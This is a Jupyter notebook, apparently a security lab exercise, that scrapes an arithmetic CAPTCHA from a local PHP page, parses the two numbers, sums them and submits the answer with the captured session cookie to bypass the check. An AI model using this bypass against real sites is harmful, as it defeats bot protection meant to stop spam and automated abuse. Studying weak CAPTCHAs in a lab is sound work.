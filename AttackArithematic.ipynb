{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "serial-filename",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: requests in /Users/admin/anaconda3/lib/python3.7/site-packages (2.25.1)\n",
      "Requirement already satisfied: idna<3,>=2.5 in /Users/admin/anaconda3/lib/python3.7/site-packages (from requests) (2.10)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /Users/admin/anaconda3/lib/python3.7/site-packages (from requests) (2022.5.18.1)\n",
      "Requirement already satisfied: chardet<5,>=3.0.2 in /Users/admin/anaconda3/lib/python3.7/site-packages (from requests) (4.0.0)\n",
      "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /Users/admin/anaconda3/lib/python3.7/site-packages (from requests) (1.25.11)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "collaborative-medline",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "union-bumper",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "response = requests.get(\"http://localhost/arcap.php\")\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "modified-shark",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ParseResult(scheme='http', netloc='localhost', path='/arcap.php', params='', query='', fragment='')\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<function urllib.parse.parse_qs(qs, keep_blank_values=False, strict_parsing=False, encoding='utf-8', errors='replace', max_num_fields=None)>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from urllib.parse import urlparse, parse_qs\n",
    "URL=\"http://localhost/arcap.php\"\n",
    "parsed_url = urlparse(URL)\n",
    "parse_qs(parsed_url.query)\n",
    "print(parsed_url)\n",
    "parse_qs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "exempt-semester",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "closed-gravity",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<html>\\r\\n<h3>Please solve the CAPTCHA</h3>\\r\\n45+83<br>\\r\\n<br>\\r\\n<form action=\"captchaarithvalidate.php\" method=\"post\">\\r\\n<input name=\"captcha\" type=\"text\">\\r\\n<input name=\"submit\" type=\"submit\" value=\"Submit\">\\r\\n</form>\\r\\n</html>\\r\\n\\r\\n'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "lovely-battery",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<html>\\r\\n<h3>Please solve the CAPTCHA</h3>\\r\\n45+83<br>\\r\\n<br>\\r\\n<form action=\"captchaarithvalidate.php\" method=\"post\">\\r\\n<input name=\"captcha\" type=\"text\">\\r\\n<input name=\"submit\" type=\"submit\" value=\"Submit\">\\r\\n</form>\\r\\n</html>\\r\\n\\r\\n'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "charming-gamma",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<RequestsCookieJar[Cookie(version=0, name='PHPSESSID', value='49f18d064f78b9f9d6487773890ae557', port=None, port_specified=False, domain='localhost.local', domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={}, rfc2109=False)]>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.cookies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "million-luther",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "session = requests.Session()\n",
    "r=session.get(URL)\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "romance-destiny",
   "metadata": {},
   "outputs": [],
   "source": [
    "cookiejar=r.cookies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "numerical-mexican",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Wed, 01 Jun 2022 22:17:06 GMT', 'Server': 'Apache/2.4.53 (Unix) OpenSSL/1.1.1o PHP/7.4.29 mod_perl/2.0.12 Perl/v5.34.1', 'X-Powered-By': 'PHP/7.4.29', 'Set-Cookie': 'PHPSESSID=49f18d064f78b9f9d6487773890ae557; path=/', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Pragma': 'no-cache', 'Content-Length': '224', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "hairy-apple",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'PHPSESSID=49f18d064f78b9f9d6487773890ae557; path=/'"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.headers['Set-Cookie']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "obvious-decision",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "49f18d064f78b9f9d6487773890ae557; path\n"
     ]
    }
   ],
   "source": [
    "s=response.headers['Set-Cookie']\n",
    "v=s.split(\"=\")\n",
    "print(v[1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "million-assembly",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PHPSESSID=49f18d064f78b9f9d6487773890ae557\n",
      "PHPSESSID=49f18d064f78b9f9d6487773890ae557\n",
      " path=/\n"
     ]
    }
   ],
   "source": [
    "news=response.headers['Set-Cookie']\n",
    "v=s.split(\";\")\n",
    "print(v[0])\n",
    "fullcookiestring=v[0]\n",
    "print(fullcookiestring)\n",
    "\n",
    "newv=v[1].split(\";\")\n",
    "cookievalue=newv[0]\n",
    "print(cookievalue)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "heard-bride",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[\"b'<html>\\\\r\\\\n<h3>Please solve the CAPTCHA</h3>\\\\r\\\\n45\", '83<br>\\\\r\\\\n<br>\\\\r\\\\n<form action=\"captchaarithvalidate.php\" method=\"post\">\\\\r\\\\n<input name=\"captcha\" type=\"text\">\\\\r\\\\n<input name=\"submit\" type=\"submit\" value=\"Submit\">\\\\r\\\\n</form>\\\\r\\\\n</html>\\\\r\\\\n\\\\r\\\\n\\'']\n"
     ]
    }
   ],
   "source": [
    "responseString=str(response.content)\n",
    "newresponse=responseString.split(\"+\")\n",
    "print(newresponse)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "confidential-relay",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'<html>\\r\\n<h3>Please solve the CAPTCHA</h3>\\r\\n45\n",
      "83<br>\\r\\n<br>\\r\\n<form action=\"captchaarithvalidate.php\" method=\"post\">\\r\\n<input name=\"captcha\" type=\"text\">\\r\\n<input name=\"submit\" type=\"submit\" value=\"Submit\">\\r\\n</form>\\r\\n</html>\\r\\n\\r\\n'\n"
     ]
    }
   ],
   "source": [
    "print(newresponse[0])      \n",
    "print(newresponse[1])      "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "baking-strand",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num1 45\n",
      "num2 83\n"
     ]
    }
   ],
   "source": [
    "num1=0\n",
    "num2=0\n",
    "nr=newresponse[0]\n",
    "nr2=newresponse[1]\n",
    "for i,c in enumerate(nr):\n",
    "    if c.isdigit() and nr[i-1]!=\"h\":\n",
    "        num1=num1*10+ord(c)-ord('0')\n",
    "for i,c in enumerate(nr2):\n",
    "    if c.isdigit():\n",
    "        num2=num2*10+ord(c)-ord('0')\n",
    "print(\"num1\",num1)\n",
    "print(\"num2\",num2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "pressing-onion",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "128"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result=num1+num2\n",
    "result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "going-sherman",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ParseResult(scheme='http', netloc='localhost', path='/arcap.php', params='', query='', fragment='')\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'/arcap.php'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from urllib.parse import urlparse, parse_qs\n",
    "URL=\"http://localhost/arcap.php\"\n",
    "parsed_url = urlparse(URL)\n",
    "parse_qs(parsed_url.query)\n",
    "print(parsed_url)\n",
    "parsed_url.path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "racial-committee",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Wed, 01 Jun 2022 22:17:06 GMT', 'Server': 'Apache/2.4.53 (Unix) OpenSSL/1.1.1o PHP/7.4.29 mod_perl/2.0.12 Perl/v5.34.1', 'X-Powered-By': 'PHP/7.4.29', 'Set-Cookie': 'PHPSESSID=49f18d064f78b9f9d6487773890ae557; path=/', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Pragma': 'no-cache', 'Content-Length': '224', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "response.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "respected-river",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PHPSESSID=49f18d064f78b9f9d6487773890ae557\n",
      "<Response [200]>\n",
      "<RequestsCookieJar[]>\n",
      "response body is\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'captchabelow128sessioncode128Correct Code Entered'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "headers = {\"Cookie\": fullcookiestring }\n",
    "print(fullcookiestring)\n",
    "data = {\n",
    "    \"captcha\": result,\n",
    "   \n",
    "}\n",
    " \n",
    "\n",
    "import requests\n",
    "\n",
    "r=requests.post(\"http://localhost/captchaarithvalidate.php\",data=data, headers=headers)\n",
    "print(r)\n",
    "print(r.cookies)\n",
    "print(\"response body is\\n\")\n",
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acknowledged-laptop",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
